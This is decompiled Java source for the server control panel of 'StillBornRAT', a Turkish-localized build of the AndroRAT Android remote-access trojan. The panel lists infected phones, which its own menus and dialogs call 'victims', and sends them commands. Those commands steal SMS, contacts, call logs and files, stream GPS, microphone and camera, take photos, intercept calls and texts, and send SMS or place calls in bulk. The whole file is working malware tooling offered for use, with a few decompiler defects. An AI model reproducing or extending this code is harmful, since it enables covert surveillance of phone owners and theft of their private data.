/*   1:    */ package gui;
/*   2:    */ 
/*   3:    */ import Packet.AdvancedInformationPacket;
/*   4:    */ import Packet.CallPacket;
/*   5:    */ import Packet.PreferencePacket;
/*   6:    */ import Packet.SMSPacket;
/*   7:    */ import gui.panel.ColorPane;
/*   8:    */ import inout.Protocol;
/*   9:    */ import java.awt.Color;
/*  10:    */ import java.awt.Component;
/*  11:    */ import java.awt.Container;
/*  12:    */ import java.awt.Font;
/*  13:    */ import java.awt.Image;
/*  14:    */ import java.awt.Toolkit;
/*  15:    */ import java.awt.event.ActionEvent;
/*  16:    */ import java.awt.event.ActionListener;
/*  17:    */ import java.awt.event.MouseAdapter;
/*  18:    */ import java.awt.event.MouseEvent;
/*  19:    */ import java.awt.image.BufferedImage;
/*  20:    */ import java.io.File;
/*  21:    */ import java.io.IOException;
/*  22:    */ import java.nio.ByteBuffer;
/*  23:    */ import java.util.ArrayList;
/*  24:    */ import java.util.Date;
/*  25:    */ import java.util.HashMap;
/*  26:    */ import java.util.HashSet;
/*  27:    */ import java.util.logging.Level;
/*  28:    */ import java.util.logging.Logger;
/*  29:    */ import javax.imageio.ImageIO;
/*  30:    */ import javax.swing.GroupLayout;
/*  31:    */ import javax.swing.GroupLayout.Alignment;
/*  32:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  33:    */ import javax.swing.ImageIcon;
/*  34:    */ import javax.swing.JCheckBoxMenuItem;
/*  35:    */ import javax.swing.JFrame;
/*  36:    */ import javax.swing.JMenu;
/*  37:    */ import javax.swing.JMenuBar;
/*  38:    */ import javax.swing.JMenuItem;
/*  39:    */ import javax.swing.JOptionPane;
/*  40:    */ import javax.swing.JScrollPane;
/*  41:    */ import javax.swing.JSplitPane;
/*  42:    */ import javax.swing.JTable;
/*  43:    */ import javax.swing.KeyStroke;
/*  44:    */ import javax.swing.UIManager;
/*  45:    */ import javax.swing.UnsupportedLookAndFeelException;
/*  46:    */ import javax.swing.table.DefaultTableCellRenderer;
/*  47:    */ import javax.swing.table.TableColumn;
/*  48:    */ import javax.swing.table.TableColumnModel;
/*  49:    */ import server.Server;
/*  50:    */ import utils.Contact;
/*  51:    */ import utils.EncoderHelper;
/*  52:    */ import utils.MyFile;
/*  53:    */ 
/*  54:    */ public class GUI
/*  55:    */   extends JFrame
/*  56:    */ {
/*  57:    */   private JMenuItem buttonRemoveUser;
/*  58:    */   private JMenuItem buttonUserGUI;
/*  59:    */   private JMenuItem buttonExit;
/*  60:    */   private JMenuItem buttonAbout;
/*  61:    */   private JMenu jMenu1;
/*  62:    */   private JMenu jMenu2;
/*  63:    */   private JMenuBar jMenuBar1;
/*  64:    */   private JScrollPane jScrollPane1;
/*  65:    */   private JScrollPane jScrollPane;
/*  66:    */   private JTable userTable;
/*  67:    */   private JSplitPane splitPane;
/*  68:    */   private UserModel model;
/*  69:    */   private HashMap<String, UserGUI> guiMap;
/*  70:    */   private ColorPane logPanel;
/*  71:    */   private Server server;
/*  72:    */   private JCheckBoxMenuItem chckbxmntmShowLogs;
/*  73:    */   private JMenu mnAbout;
/*  74:    */   private JMenu mnBulkActions;
/*  75:    */   private JMenuItem mntmToastit;
/*  76:    */   private JMenuItem mntmSendSms;
/*  77:    */   private JMenuItem mntmGiveCall;
/*  78:    */   private JMenuItem mntmPort;
/*  79:    */   
/*  80:    */   public GUI(Server server, int port)
/*  81:    */   {
/*  82:104 */     this.server = server;
/*  83:105 */     this.guiMap = new HashMap();
/*  84:    */     
/*  85:107 */     initComponents();
/*  86:    */     
/*  87:109 */     this.model = new UserModel();
/*  88:110 */     this.userTable.setModel(this.model);
/*  89:111 */     this.userTable.setSelectionMode(0);
/*  90:112 */     this.userTable.getColumnModel().getColumn(0).setCellRenderer(new MyRenderer());
/*  91:113 */     this.logPanel.append(Color.blue, "*** StillBornRAT SERVER ***\nInitialized: " + 
/*  92:    */     
/*  93:115 */       new Date(System.currentTimeMillis()) + "\n" + 
/*  94:116 */       "Port : " + port + "\n");
/*  95:    */     
/*  96:118 */     centrerTable(this.userTable);
/*  97:    */     
/*  98:120 */     setLocationRelativeTo(null);
/*  99:121 */     setTitle("StillBornRAT");
/* 100:122 */     setVisible(true);
/* 101:    */   }
/* 102:    */   
/* 103:    */   public void logErrTxt(String txt)
/* 104:    */   {
/* 105:131 */     this.logPanel.append(Color.red, new Date(System.currentTimeMillis()) + " " + txt + "\n");
/* 106:    */   }
/* 107:    */   
/* 108:    */   public void logTxt(String txt)
/* 109:    */   {
/* 110:135 */     this.logPanel.append(Color.black, new Date(System.currentTimeMillis()) + " " + txt + "\n");
/* 111:    */   }
/* 112:    */   
/* 113:    */   public void clientLogTxt(String imei, long date, String txt)
/* 114:    */   {
/* 115:139 */     ((UserGUI)this.guiMap.get(imei)).logTxt(date, txt);
/* 116:    */   }
/* 117:    */   
/* 118:    */   public void clientErrLogTxt(String imei, long date, String txt)
/* 119:    */   {
/* 120:144 */     ((UserGUI)this.guiMap.get(imei)).errLogTxt(date, txt);
/* 121:    */   }
/* 122:    */   
/* 123:    */   private void buttonStartActionPerformed()
/* 124:    */   {
/* 125:    */     try
/* 126:    */     {
/* 127:156 */       for (int row = 0; row < this.userTable.getRowCount(); row++)
/* 128:    */       {
/* 129:157 */         String imei = (String)this.model.getValueAt(row, 0);
/* 130:158 */         if (imei != null) {
/* 131:158 */           this.server.commandSender(imei, (short)5, null);
/* 132:    */         }
/* 133:    */       }
/* 134:    */     }
/* 135:    */     catch (Exception localException) {}finally
/* 136:    */     {
/* 137:163 */       dispose();
/* 138:    */     }
/* 139:    */   }
/* 140:    */   
/* 141:    */   private void buttonUserGUIActionPerformed()
/* 142:    */   {
/* 143:168 */     int row = this.userTable.getSelectedRow();
/* 144:169 */     if (row != -1)
/* 145:    */     {
/* 146:170 */       String imei = (String)this.model.getValueAt(row, 1);
/* 147:172 */       if (imei != null)
/* 148:    */       {
/* 149:173 */         UserGUI gui = (UserGUI)this.guiMap.get(imei);
/* 150:174 */         if (gui == null)
/* 151:    */         {
/* 152:175 */           gui = new UserGUI(imei, this);
/* 153:176 */           this.guiMap.put(imei, gui);
/* 154:    */         }
/* 155:    */         else
/* 156:    */         {
/* 157:178 */           gui.setVisible(true);
/* 158:    */         }
/* 159:    */       }
/* 160:    */     }
/* 161:    */     else
/* 162:    */     {
/* 163:183 */       JOptionPane.showMessageDialog(this, "Kurban seçilmedi !\nLütfen bir kurban seçin.", "Seçim yok", 0);
/* 164:    */     }
/* 165:    */   }
/* 166:    */   
/* 167:    */   private void buttonRemoveUserActionPerformed()
/* 168:    */   {
/* 169:188 */     int row = this.userTable.getSelectedRow();
/* 170:189 */     if (row != -1)
/* 171:    */     {
/* 172:190 */       String imei = (String)this.model.getValueAt(row, 1);
/* 173:191 */       if (imei != null)
/* 174:    */       {
/* 175:192 */         this.server.commandSender(imei, (short)5, null);
/* 176:193 */         deleteUser(imei);
/* 177:    */       }
/* 178:    */     }
/* 179:    */     else
/* 180:    */     {
/* 181:196 */       JOptionPane.showMessageDialog(this, "Kurban seçilmedi !\nLütfen bir kurban seçin.", "Seçim yok", 0);
/* 182:    */     }
/* 183:    */   }
/* 184:    */   
/* 185:    */   private void buttonAboutActionPerformed()
/* 186:    */   {
/* 187:201 */     JOptionPane.showMessageDialog(this, "StillBornRAT Androrat kaynak kodundan derlenmiştir.\nYazarlar : A.Bertrand, R.David, A.Akimov & P.Junk\n\nDerleyen : StillBorn: http://cryptosuite.org/forum/members/stillborn.html\n\nDiKKAT! Oluşacak her türlü sorundan kullanıcı sorumludur!\n\nBu program GNU GPL3 Lisansı altındadır!", 
/* 188:    */     
/* 189:203 */       "StillBornRAT Hakkında", 1, 
/* 190:204 */       new ImageIcon(getIconImage()));
/* 191:    */   }
/* 192:    */   
/* 193:    */   private void buttonShowLogs()
/* 194:    */   {
/* 195:208 */     if (this.chckbxmntmShowLogs.isSelected())
/* 196:    */     {
/* 197:209 */       this.logPanel.setVisible(true);
/* 198:210 */       this.jScrollPane.setVisible(true);
/* 199:211 */       this.splitPane.setDividerLocation(0.5D);
/* 200:    */     }
/* 201:    */     else
/* 202:    */     {
/* 203:213 */       this.logPanel.setVisible(false);
/* 204:214 */       this.jScrollPane.setVisible(false);
/* 205:215 */       this.splitPane.setDividerLocation(1);
/* 206:    */     }
/* 207:    */   }
/* 208:    */   
/* 209:    */   public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator)
/* 210:    */   {
/* 211:247 */     if (countryCode == null) {
/* 212:247 */       countryCode = "/";
/* 213:    */     }
/* 214:248 */     if (telNumber == null) {
/* 215:248 */       telNumber = "/";
/* 216:    */     }
/* 217:249 */     if (simCountryCode == null) {
/* 218:249 */       simCountryCode = "/";
/* 219:    */     }
/* 220:250 */     if (simOperator == null) {
/* 221:250 */       simOperator = "/";
/* 222:    */     }
/* 223:251 */     if (simSerial == null) {
/* 224:251 */       simSerial = "/";
/* 225:    */     }
/* 226:252 */     if (operator == null) {
/* 227:252 */       operator = "/";
/* 228:    */     }
/* 229:254 */     this.model.addUser(new User(countryCode, imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
/* 230:    */   }
/* 231:    */   
/* 232:    */   public class MyRenderer
/* 233:    */     extends DefaultTableCellRenderer
/* 234:    */   {
/* 235:    */     public MyRenderer() {}
/* 236:    */     
/* 237:    */     public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column)
/* 238:    */     {
/* 239:262 */       String country = (String)value;
/* 240:    */       
/* 241:    */ 
/* 242:265 */       File f = new File("src/gui/res/Drapeau/" + country.toUpperCase() + ".png");
/* 243:    */       ImageIcon getImg;
/* 244:    */       ImageIcon getImg;
/* 245:266 */       if (f.exists()) {
/* 246:268 */         getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(
/* 247:269 */           UserGUI.class.getResource("/gui/res/Drapeau/" + country.toUpperCase() + ".png")));
/* 248:    */       } else {
/* 249:271 */         getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/Drapeau/default.jpeg")));
/* 250:    */       }
/* 251:273 */       Image img = getImg.getImage();
/* 252:274 */       Image newimg = img.getScaledInstance(64, 64, 4);
/* 253:275 */       ImageIcon imgResize = new ImageIcon(newimg);
/* 254:276 */       setIcon(imgResize);
/* 255:277 */       return this;
/* 256:    */     }
/* 257:    */   }
/* 258:    */   
/* 259:    */   public void deleteUser(String imei)
/* 260:    */   {
/* 261:287 */     this.model.removeUser(imei);
/* 262:288 */     UserGUI gui = (UserGUI)this.guiMap.get(imei);
/* 263:289 */     if (gui != null)
/* 264:    */     {
/* 265:290 */       if (gui.isVisible()) {
/* 266:290 */         gui.launchMessageDialog("Bu kurban artık mevcut değil.\nÇerçeve kapatılıyor ...", "Bağlantı kesiliyor", 0);
/* 267:    */       }
/* 268:291 */       gui.dispose();
/* 269:    */     }
/* 270:293 */     this.guiMap.remove(imei);
/* 271:294 */     getContentPane().repaint();
/* 272:    */   }
/* 273:    */   
/* 274:    */   public void closeUserGUI(String imei)
/* 275:    */   {
/* 276:302 */     this.guiMap.remove(imei);
/* 277:    */   }
/* 278:    */   
/* 279:    */   public void updateAdvInformations(String imei, AdvancedInformationPacket packet)
/* 280:    */   {
/* 281:311 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 282:312 */     user.updateHomeInformations(packet);
/* 283:    */   }
/* 284:    */   
/* 285:    */   public void updatePreference(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw)
/* 286:    */   {
/* 287:316 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 288:317 */     user.updatePreference(ip, port, wait, phones, sms, kw);
/* 289:    */   }
/* 290:    */   
/* 291:    */   public void updateUserMap(String imei, double lon, double lat, double alt, float speed, float accuracy)
/* 292:    */   {
/* 293:321 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 294:322 */     user.updateMap(lon, lat, alt, speed, accuracy);
/* 295:    */   }
/* 296:    */   
/* 297:    */   public void updateUserPicture(String imei, byte[] picture)
/* 298:    */   {
/* 299:326 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 300:327 */     user.updatePicture(picture);
/* 301:    */   }
/* 302:    */   
/* 303:    */   public void addSoungBytes(String imei, byte[] data)
/* 304:    */   {
/* 305:331 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 306:332 */     user.addSoundBytes(data);
/* 307:    */   }
/* 308:    */   
/* 309:    */   public void addVideoBytes(String imei, byte[] data)
/* 310:    */   {
/* 311:336 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 312:337 */     user.addVideoBytes(data);
/* 313:    */   }
/* 314:    */   
/* 315:    */   public void updateFileTree(String imei, ArrayList<MyFile> fileList)
/* 316:    */   {
/* 317:341 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 318:342 */     user.updateFileTree(fileList);
/* 319:    */   }
/* 320:    */   
/* 321:    */   public void updateUserCallLogs(String imei, ArrayList<CallPacket> logsList)
/* 322:    */   {
/* 323:346 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 324:347 */     user.updateCallLogs(logsList);
/* 325:    */   }
/* 326:    */   
/* 327:    */   public void updateContacts(String imei, ArrayList<Contact> contacts)
/* 328:    */   {
/* 329:351 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 330:352 */     user.updateContacts(contacts);
/* 331:    */   }
/* 332:    */   
/* 333:    */   public void addMonitoredCall(String imei, int type, String phoneNumber)
/* 334:    */   {
/* 335:356 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 336:357 */     user.addMonitoredCall(type, phoneNumber);
/* 337:    */   }
/* 338:    */   
/* 339:    */   public void addMonitoredSMS(String imei, String addr, long date, String body)
/* 340:    */   {
/* 341:361 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 342:362 */     user.addMonitoredSMS(addr, date, body);
/* 343:    */   }
/* 344:    */   
/* 345:    */   public void updateSMS(String imei, ArrayList<SMSPacket> sms)
/* 346:    */   {
/* 347:366 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 348:367 */     user.updateSMS(sms);
/* 349:    */   }
/* 350:    */   
/* 351:    */   public void saveMapChannel(String imei, int channel)
/* 352:    */   {
/* 353:377 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 354:378 */     user.saveMapChannel(channel);
/* 355:    */   }
/* 356:    */   
/* 357:    */   public void saveCallLogChannel(String imei, int channel)
/* 358:    */   {
/* 359:382 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 360:383 */     user.saveCallLogChannel(channel);
/* 361:    */   }
/* 362:    */   
/* 363:    */   public void saveContactChannel(String imei, int channel)
/* 364:    */   {
/* 365:387 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 366:388 */     user.saveContactChannel(channel);
/* 367:    */   }
/* 368:    */   
/* 369:    */   public void saveMonitorSMSChannel(String imei, int channel)
/* 370:    */   {
/* 371:392 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 372:393 */     user.saveMonitorSMSChannel(channel);
/* 373:    */   }
/* 374:    */   
/* 375:    */   public void saveMonitorCallChannel(String imei, int channel)
/* 376:    */   {
/* 377:397 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 378:398 */     user.saveMonitorCallChannel(channel);
/* 379:    */   }
/* 380:    */   
/* 381:    */   public void savePictureChannel(String imei, int channel)
/* 382:    */   {
/* 383:402 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 384:403 */     user.savePictureChannel(channel);
/* 385:    */   }
/* 386:    */   
/* 387:    */   public void saveSoundChannel(String imei, int channel)
/* 388:    */   {
/* 389:407 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 390:408 */     user.saveSoundChannel(channel);
/* 391:    */   }
/* 392:    */   
/* 393:    */   public void saveVideoChannel(String imei, int channel)
/* 394:    */   {
/* 395:412 */     UserGUI user = (UserGUI)this.guiMap.get(imei);
/* 396:413 */     user.saveVideoChannel(channel);
/* 397:    */   }
/* 398:    */   
/* 399:    */   public void saveSMSChannel(String imei, int channel) {}
/* 400:    */   
/* 401:    */   public void fireGetAdvInformations(String imei)
/* 402:    */   {
/* 403:426 */     this.server.commandSender(imei, Protocol.GET_ADV_INFORMATIONS, null);
/* 404:427 */     this.server.commandSender(imei, (short)21, null);
/* 405:    */   }
/* 406:    */   
/* 407:    */   public void fireGetSMS(String imei, String req)
/* 408:    */   {
/* 409:431 */     this.server.commandSender(imei, Protocol.GET_SMS, req.getBytes());
/* 410:    */   }
/* 411:    */   
/* 412:    */   public void fireStartGPSStreaming(String imei, String provider)
/* 413:    */   {
/* 414:435 */     this.server.commandSender(imei, Protocol.GET_GPS_STREAM, provider.getBytes());
/* 415:    */   }
/* 416:    */   
/* 417:    */   public void fireStopGPSStreaming(String imei, int channel)
/* 418:    */   {
/* 419:439 */     this.server.commandStopSender(imei, Protocol.STOP_GPS_STREAM, null, channel);
/* 420:    */   }
/* 421:    */   
/* 422:    */   public void fireStartSoundStreaming(String imei, int source)
/* 423:    */   {
/* 424:443 */     byte[] byteSource = ByteBuffer.allocate(4).putInt(source).array();
/* 425:444 */     this.server.commandSender(imei, Protocol.GET_SOUND_STREAM, byteSource);
/* 426:    */   }
/* 427:    */   
/* 428:    */   public void fireStopSoundStreaming(String imei, int channel)
/* 429:    */   {
/* 430:448 */     this.server.commandStopSender(imei, Protocol.STOP_SOUND_STREAM, null, channel);
/* 431:    */   }
/* 432:    */   
/* 433:    */   public void fireStartVideoStream(String imei)
/* 434:    */   {
/* 435:452 */     this.server.commandSender(imei, Protocol.GET_VIDEO_STREAM, null);
/* 436:    */   }
/* 437:    */   
/* 438:    */   public void fireStopVideoStream(String imei, int channel)
/* 439:    */   {
/* 440:456 */     this.server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null, channel);
/* 441:    */   }
/* 442:    */   
/* 443:    */   public void fireTakePicture(String imei)
/* 444:    */   {
/* 445:460 */     this.server.commandSender(imei, Protocol.GET_PICTURE, null);
/* 446:    */   }
/* 447:    */   
/* 448:    */   public void fireFileDownload(String imei, String path, String downPath, String downName)
/* 449:    */   {
/* 450:464 */     this.server.commandFileSender(imei, Protocol.GET_FILE, path.getBytes(), downPath, downName);
/* 451:    */   }
/* 452:    */   
/* 453:    */   public void fireTreeFile(String imei)
/* 454:    */   {
/* 455:468 */     this.server.commandSender(imei, Protocol.LIST_DIR, "/".getBytes());
/* 456:    */   }
/* 457:    */   
/* 458:    */   public void fireToastMessage(String imei, String txt)
/* 459:    */   {
/* 460:472 */     this.server.commandSender(imei, Protocol.DO_TOAST, txt.getBytes());
/* 461:    */   }
/* 462:    */   
/* 463:    */   public void fireVibrate(String imei, Long duration)
/* 464:    */   {
/* 465:476 */     this.server.commandSender(imei, Protocol.DO_VIBRATE, EncoderHelper.encodeLong(duration.longValue()));
/* 466:    */   }
/* 467:    */   
/* 468:    */   public void fireBrowseUrl(String imei, String url)
/* 469:    */   {
/* 470:480 */     this.server.commandSender(imei, Protocol.OPEN_BROWSER, url.getBytes());
/* 471:    */   }
/* 472:    */   
/* 473:    */   public void fireSendSMS(String imei, HashMap<String, String> map)
/* 474:    */   {
/* 475:484 */     byte[] data = EncoderHelper.encodeHashMap(map);
/* 476:485 */     this.server.commandSender(imei, Protocol.SEND_SMS, data);
/* 477:    */   }
/* 478:    */   
/* 479:    */   public void fireGiveCall(String imei, String target)
/* 480:    */   {
/* 481:489 */     this.server.commandSender(imei, Protocol.GIVE_CALL, target.getBytes());
/* 482:    */   }
/* 483:    */   
/* 484:    */   public void fireCallLogs(String imei, String request)
/* 485:    */   {
/* 486:493 */     this.server.commandSender(imei, Protocol.GET_CALL_LOGS, request.getBytes());
/* 487:    */   }
/* 488:    */   
/* 489:    */   public void fireContacts(String imei)
/* 490:    */   {
/* 491:497 */     this.server.commandSender(imei, Protocol.GET_CONTACTS, null);
/* 492:    */   }
/* 493:    */   
/* 494:    */   public void fireStartCallMonitoring(String imei, HashSet<String> phoneNumbers)
/* 495:    */   {
/* 496:501 */     this.server.commandSender(imei, Protocol.MONITOR_CALL, EncoderHelper.encodeHashSet(phoneNumbers));
/* 497:    */   }
/* 498:    */   
/* 499:    */   public void fireStopCallMonitoring(String imei, int channel)
/* 500:    */   {
/* 501:505 */     this.server.commandStopSender(imei, Protocol.STOP_MONITOR_CALL, null, channel);
/* 502:    */   }
/* 503:    */   
/* 504:    */   public void fireStartSMSMonitoring(String imei, HashSet<String> phoneNumbers)
/* 505:    */   {
/* 506:509 */     this.server.commandSender(imei, Protocol.MONITOR_SMS, EncoderHelper.encodeHashSet(phoneNumbers));
/* 507:    */   }
/* 508:    */   
/* 509:    */   public void fireStopSMSMonitoring(String imei, int channel)
/* 510:    */   {
/* 511:513 */     this.server.commandStopSender(imei, Protocol.STOP_MONITOR_SMS, null, channel);
/* 512:    */   }
/* 513:    */   
/* 514:    */   public void fireSaveConnectConfiguration(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw)
/* 515:    */   {
/* 516:517 */     PreferencePacket pp = new PreferencePacket(ip, port, wait, phones, sms, kw);
/* 517:518 */     this.server.commandSender(imei, (short)20, pp.build());
/* 518:    */   }
/* 519:    */   
/* 520:    */   private void fireBulkToast()
/* 521:    */   {
/* 522:525 */     String txt = JOptionPane.showInputDialog(this, "Metni girin :");
/* 523:526 */     if (txt != null) {
/* 524:527 */       for (int row = 0; row < this.userTable.getRowCount(); row++)
/* 525:    */       {
/* 526:528 */         String imei = (String)this.model.getValueAt(row, 1);
/* 527:529 */         if (imei != null) {
/* 528:529 */           fireToastMessage(imei, txt);
/* 529:    */         }
/* 530:    */       }
/* 531:    */     }
/* 532:    */   }
/* 533:    */   
/* 534:    */   private void fireBulkSMS()
/* 535:    */   {
/* 536:535 */     SMSDialog dialog = new SMSDialog(this);
/* 537:536 */     String[] res = dialog.showDialog();
/* 538:537 */     if (res != null)
/* 539:    */     {
/* 540:538 */       HashMap<String, String> map = new HashMap();
/* 541:539 */       map.put("number", res[0]);
/* 542:540 */       map.put("body", res[1]);
/* 543:542 */       for (int row = 0; row < this.userTable.getRowCount(); row++)
/* 544:    */       {
/* 545:543 */         String imei = (String)this.model.getValueAt(row, 1);
/* 546:544 */         if (imei != null) {
/* 547:544 */           fireSendSMS(imei, map);
/* 548:    */         }
/* 549:    */       }
/* 550:    */     }
/* 551:    */   }
/* 552:    */   
/* 553:    */   private void fireBulkCall()
/* 554:    */   {
/* 555:550 */     String target = JOptionPane.showInputDialog(this, "Hedef telefon numarasını girin :");
/* 556:551 */     if (target != null) {
/* 557:552 */       for (int row = 0; row < this.userTable.getRowCount(); row++)
/* 558:    */       {
/* 559:553 */         String imei = (String)this.model.getValueAt(row, 1);
/* 560:554 */         if (imei != null) {
/* 561:554 */           fireToastMessage(imei, target);
/* 562:    */         }
/* 563:    */       }
/* 564:    */     }
/* 565:    */   }
/* 566:    */   
/* 567:    */   private void fireSelectPort()
/* 568:    */   {
/* 569:560 */     String rep = JOptionPane.showInputDialog(this, "Yeni server portunu girin (yeniden başlatma gerektirir) : ");
/* 570:561 */     this.server.savePortConfig(rep);
/* 571:    */   }
/* 572:    */   
/* 573:    */   private void userMouseClicked(MouseEvent e)
/* 574:    */   {
/* 575:565 */     if (e.getClickCount() == 2) {
/* 576:566 */       buttonUserGUIActionPerformed();
/* 577:    */     }
/* 578:    */   }
/* 579:    */   
/* 580:    */   private void initComponents()
/* 581:    */   {
/* 582:    */     try
/* 583:    */     {
/* 584:578 */       UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
/* 585:    */     }
/* 586:    */     catch (ClassNotFoundException ex)
/* 587:    */     {
/* 588:580 */       Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
/* 589:    */     }
/* 590:    */     catch (InstantiationException ex)
/* 591:    */     {
/* 592:582 */       Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
/* 593:    */     }
/* 594:    */     catch (IllegalAccessException ex)
/* 595:    */     {
/* 596:584 */       Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
/* 597:    */     }
/* 598:    */     catch (UnsupportedLookAndFeelException ex)
/* 599:    */     {
/* 600:586 */       Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
/* 601:    */     }
/* 602:589 */     BufferedImage image = null;
/* 603:    */     try
/* 604:    */     {
/* 605:591 */       image = ImageIO.read(
/* 606:592 */         getClass().getResource("/gui/res/androrat_logo_32pix.png"));
/* 607:    */     }
/* 608:    */     catch (IOException e)
/* 609:    */     {
/* 610:594 */       e.printStackTrace();
/* 611:    */     }
/* 612:596 */     setIconImage(image);
/* 613:597 */     this.jMenuBar1 = new JMenuBar();
/* 614:598 */     this.jMenu1 = new JMenu();
/* 615:599 */     this.buttonExit = new JMenuItem();
/* 616:600 */     this.jMenu2 = new JMenu();
/* 617:601 */     this.buttonRemoveUser = new JMenuItem();
/* 618:602 */     this.buttonUserGUI = new JMenuItem();
/* 619:    */     
/* 620:604 */     setDefaultCloseOperation(3);
/* 621:    */     
/* 622:606 */     this.jMenu1.setText("Server");
/* 623:    */     
/* 624:608 */     this.buttonExit.setText("Çıkış");
/* 625:609 */     this.buttonExit.addActionListener(new ActionListener()
/* 626:    */     {
/* 627:    */       public void actionPerformed(ActionEvent evt)
/* 628:    */       {
/* 629:612 */         GUI.this.buttonStartActionPerformed();
/* 630:    */       }
/* 631:614 */     });
/* 632:615 */     this.jMenu1.add(this.buttonExit);
/* 633:    */     
/* 634:617 */     this.chckbxmntmShowLogs = new JCheckBoxMenuItem("Logları görüntüle");
/* 635:618 */     this.chckbxmntmShowLogs.addActionListener(new ActionListener()
/* 636:    */     {
/* 637:    */       public void actionPerformed(ActionEvent e)
/* 638:    */       {
/* 639:621 */         GUI.this.buttonShowLogs();
/* 640:    */       }
/* 641:624 */     });
/* 642:625 */     this.mntmPort = new JMenuItem("Port seç");
/* 643:626 */     this.mntmPort.addActionListener(new ActionListener()
/* 644:    */     {
/* 645:    */       public void actionPerformed(ActionEvent e)
/* 646:    */       {
/* 647:628 */         GUI.this.fireSelectPort();
/* 648:    */       }
/* 649:630 */     });
/* 650:631 */     this.jMenu1.add(this.mntmPort);
/* 651:632 */     this.chckbxmntmShowLogs.setSelected(true);
/* 652:633 */     this.jMenu1.add(this.chckbxmntmShowLogs);
/* 653:    */     
/* 654:635 */     this.jMenuBar1.add(this.jMenu1);
/* 655:    */     
/* 656:637 */     this.jMenu2.setText("Kurban eylemleri");
/* 657:    */     
/* 658:639 */     this.buttonUserGUI.setText("Kurban arayüzünü aç");
/* 659:640 */     this.buttonUserGUI.setAccelerator(KeyStroke.getKeyStroke(85, 2));
/* 660:641 */     this.buttonUserGUI.addActionListener(new ActionListener()
/* 661:    */     {
/* 662:    */       public void actionPerformed(ActionEvent evt)
/* 663:    */       {
/* 664:644 */         GUI.this.buttonUserGUIActionPerformed();
/* 665:    */       }
/* 666:646 */     });
/* 667:647 */     this.jMenu2.add(this.buttonUserGUI);
/* 668:    */     
/* 669:649 */     this.buttonRemoveUser.setText("Kurban bağlantısını kes");
/* 670:650 */     this.buttonRemoveUser.setAccelerator(KeyStroke.getKeyStroke(82, 2));
/* 671:651 */     this.buttonRemoveUser.addActionListener(new ActionListener()
/* 672:    */     {
/* 673:    */       public void actionPerformed(ActionEvent evt)
/* 674:    */       {
/* 675:654 */         GUI.this.buttonRemoveUserActionPerformed();
/* 676:    */       }
/* 677:656 */     });
/* 678:657 */     this.jMenu2.add(this.buttonRemoveUser);
/* 679:    */     
/* 680:659 */     this.jMenuBar1.add(this.jMenu2);
/* 681:    */     
/* 682:661 */     setJMenuBar(this.jMenuBar1);
/* 683:    */     
/* 684:663 */     this.mnBulkActions = new JMenu("Hızlı eylemler");
/* 685:664 */     this.jMenuBar1.add(this.mnBulkActions);
/* 686:    */     
/* 687:666 */     this.mntmToastit = new JMenuItem("Telefona uyarı gönder(toast)");
/* 688:667 */     this.mntmToastit.addActionListener(new ActionListener()
/* 689:    */     {
/* 690:    */       public void actionPerformed(ActionEvent e)
/* 691:    */       {
/* 692:670 */         GUI.this.fireBulkToast();
/* 693:    */       }
/* 694:672 */     });
/* 695:673 */     this.mnBulkActions.add(this.mntmToastit);
/* 696:    */     
/* 697:675 */     this.mntmSendSms = new JMenuItem("SMS gönder");
/* 698:676 */     this.mntmSendSms.addActionListener(new ActionListener()
/* 699:    */     {
/* 700:    */       public void actionPerformed(ActionEvent e)
/* 701:    */       {
/* 702:679 */         GUI.this.fireBulkSMS();
/* 703:    */       }
/* 704:681 */     });
/* 705:682 */     this.mnBulkActions.add(this.mntmSendSms);
/* 706:    */     
/* 707:684 */     this.mntmGiveCall = new JMenuItem("Arama yap");
/* 708:685 */     this.mntmGiveCall.addActionListener(new ActionListener()
/* 709:    */     {
/* 710:    */       public void actionPerformed(ActionEvent e)
/* 711:    */       {
/* 712:688 */         GUI.this.fireBulkCall();
/* 713:    */       }
/* 714:690 */     });
/* 715:691 */     this.mnBulkActions.add(this.mntmGiveCall);
/* 716:    */     
/* 717:693 */     this.mnAbout = new JMenu("Hakkında");
/* 718:694 */     this.jMenuBar1.add(this.mnAbout);
/* 719:695 */     this.buttonAbout = new JMenuItem();
/* 720:696 */     this.mnAbout.add(this.buttonAbout);
/* 721:    */     
/* 722:698 */     this.buttonAbout.setText("StillBornRAT hakkında");
/* 723:699 */     this.buttonAbout.addActionListener(new ActionListener()
/* 724:    */     {
/* 725:    */       public void actionPerformed(ActionEvent evt)
/* 726:    */       {
